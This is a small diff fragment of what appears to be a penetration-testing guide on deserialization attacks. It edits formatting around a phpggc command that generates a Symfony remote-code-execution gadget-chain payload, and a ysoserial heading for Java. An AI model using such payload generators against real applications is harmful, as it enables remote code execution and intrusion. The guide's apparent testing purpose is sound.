@@ -80,11 +80,9 @@ phpggc -b "Symfony/RCE4" "system" "{{ payload id }}" | clip.exe
 </template>
 </smart-tabs>
 
-
-
 ## Java
 
-### ysoserial
+### Ysoserial
 
 ### Using custom gadget chains
 
